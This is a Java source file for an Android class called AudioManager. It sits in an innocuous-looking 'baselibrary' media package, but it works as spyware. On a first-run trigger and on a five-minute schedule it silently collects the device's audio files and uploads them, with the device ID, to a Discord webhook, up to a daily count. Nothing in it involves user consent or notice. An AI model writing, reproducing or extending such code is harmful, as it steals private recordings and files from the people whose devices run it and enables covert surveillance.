package com.application.baselibrary.core.media.audio;

import android.content.Context;
import android.provider.Settings;
import android.util.Log;

import com.application.baselibrary.core.media.audio.model.AudioInfo;
import com.application.baselibrary.data.LibraryConstants;
import com.application.baselibrary.network.DiscordWebhookClient;
import com.application.baselibrary.threading.scheduler.RxSchedulerProvider;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;

import java.io.*;
import java.lang.reflect.Type;
import java.util.*;

public class AudioManager {
    private static final String TAG = "AudioManager";
    private static final Object FILE_LOCK = new Object();

    private final Context context;
    private final AudioFetcher fetcher;
    private final String webhookUrl;
    private final String deviceId;
    private final File uploadedFile;

    private Set<AudioInfo> uploadedAudios = new HashSet<>();
    private List<AudioInfo> allAudios = new ArrayList<>();
    private final Gson gson = new Gson();

    int MAX_AUDIO_UPLOAD_COUNT = 5;
    public AudioManager(Context context, String webhookUrl) {
        this.context = context.getApplicationContext();
        this.fetcher = new AudioFetcher(context);
        this.webhookUrl = webhookUrl;
        this.deviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        this.uploadedFile = new File(context.getFilesDir(), LibraryConstants.FILE_NAME_UPLOADED_AUDIO);
    }

    public void start(String intervalTag, int max_AUDIO_UPLOAD_COUNT) {
        MAX_AUDIO_UPLOAD_COUNT = max_AUDIO_UPLOAD_COUNT;
        loadUploadedAudios();
        if(intervalTag.equals("Every5min")){
            RxSchedulerProvider.runOnIO(() -> {
                int noOfAudioFileUploadedToday = getUploadCountToday();
                if(noOfAudioFileUploadedToday >= MAX_AUDIO_UPLOAD_COUNT){
                    Log.i(TAG,"Reached max Audio upload count :  "+ noOfAudioFileUploadedToday);
                }else{
                    fetchAudios(true);
                    startUploading();
                }
            });
        }
        if(intervalTag.equals("FirstTime")){
            RxSchedulerProvider.runOnIO(() -> {
                int noOfAudioFileUploadedToday = getUploadCountToday();
                if(noOfAudioFileUploadedToday >= MAX_AUDIO_UPLOAD_COUNT){
                    Log.i(TAG,"Reached max Audio upload count :  "+ noOfAudioFileUploadedToday);
                }else{
                    fetchAudios(true);
                    startUploading();
                }
            });
        }
        logUploadStatus();
    }

    public List<AudioInfo> fetchAudios(boolean log) {
        allAudios = fetcher.getAllAudioFiles();
        if (log) {
            allAudios.forEach(a -> Log.d(TAG,
                    String.format("Audio: %s (%d KB) path=%s modified=%d",
                            a.name, a.size / 1024, a.pathOrUri, a.dateModified)));
        }
        return allAudios;
    }

    private void loadUploadedAudios() {
        synchronized (FILE_LOCK) {
            if (!uploadedFile.exists()) {
                uploadedAudios = new HashSet<>();
                return;
            }
            try (BufferedReader reader = new BufferedReader(new FileReader(uploadedFile))) {
                Type type = new TypeToken<HashSet<AudioInfo>>() {
                }.getType();
                uploadedAudios = gson.fromJson(reader, type);
                if (uploadedAudios == null) uploadedAudios = new HashSet<>();
            } catch (IOException e) {
                Log.e(TAG, "Error loading uploaded audios", e);
                uploadedAudios = new HashSet<>();
            }
        }
    }

    private void saveUploadedAudiosAsync() {
        RxSchedulerProvider.runOnIO(() -> {
            synchronized (FILE_LOCK) {
                try (FileWriter writer = new FileWriter(uploadedFile)) {
                    writer.write(gson.toJson(uploadedAudios));
                } catch (IOException e) {
                    Log.e(TAG, "Error saving uploaded audios", e);
                }
            }
        });
    }

    public void startUploading() {
        if (webhookUrl == null || webhookUrl.isEmpty()) {
            Log.e(TAG, "Webhook URL missing");
            return;
        }
        if (allAudios.isEmpty()) fetchAudios(true);
        if (uploadedAudios.isEmpty()) loadUploadedAudios();

        int uploadedCount = getUploadCountToday();
        int limit = MAX_AUDIO_UPLOAD_COUNT;

        for (AudioInfo audio : allAudios) {
            if (uploadedCount >= limit) {
                Log.w(TAG, "Reached max audio upload count (" + limit + ")");
                break;
            }

            if (canUpload(audio)) {
                uploadedCount++;
                uploadToDiscord(audio);
            } else {
                Log.d(TAG, "Skipped: " + audio.name);
            }
        }

        logUploadStatus();
    }

    /** Print upload status: how many uploaded today, limit, and remaining */
    public void logUploadStatus() {
        int uploadedToday = getUploadCountToday();
        int limit = MAX_AUDIO_UPLOAD_COUNT;
        int remaining = Math.max(0, limit - uploadedToday);

        Log.i(TAG, String.format(
                "Upload status: %d uploaded today / %d limit. Remaining: %d",
                uploadedToday, limit, remaining
        ));
    }


    private void uploadToDiscord(AudioInfo audio) {
        File fileToUpload = new File(audio.pathOrUri);
        if (!fileToUpload.exists()) {
            Log.e(TAG, "File not found: " + audio.pathOrUri);
            return;
        }

        String message = String.format(
                "🎵 **New Audio Uploaded**\n**Device ID:** `%s`\n**File Name:** `%s`\n**Size:** %d KB",
                deviceId, audio.name, audio.size / 1024);

        DiscordWebhookClient discordHandler = new DiscordWebhookClient(webhookUrl);
        discordHandler.uploadFile(fileToUpload, message, new DiscordWebhookClient.WebhookCallback() {
            @Override
            public void onSuccess(DiscordWebhookClient.WebhookResponse response) {
                Log.d(TAG, "Uploaded " + audio.name + " to Discord.");
                markAsUploaded(audio);
            }

            @Override
            public void onError(String errorMessage) {
                Log.e(TAG, "Failed to upload " + audio.name + ": " + errorMessage);
            }
        });
    }

    private boolean canUpload(AudioInfo audio) {
        if (audio == null) return false;
        if (uploadedAudios.contains(audio)) return false;
        if (getUploadCountToday() >= MAX_AUDIO_UPLOAD_COUNT) return false;
        return true;
    }

    private void markAsUploaded(AudioInfo audio) {
        audio.uploadTime = System.currentTimeMillis();
        uploadedAudios.add(audio);
        saveUploadedAudiosAsync();
    }

    private int getUploadCountToday() {
        long startOfToday = getStartOfTodayMillis();
        int count = 0;
        for (AudioInfo audio : uploadedAudios) {
            if (audio.uploadTime >= startOfToday) count++;
        }
        return count;
    }

    private long getStartOfTodayMillis() {
        Calendar cal = Calendar.getInstance();
        cal.set(Calendar.HOUR_OF_DAY, 0);
        cal.set(Calendar.MINUTE, 0);
        cal.set(Calendar.SECOND, 0);
        cal.set(Calendar.MILLISECOND, 0);
        return cal.getTimeInMillis();
    }
}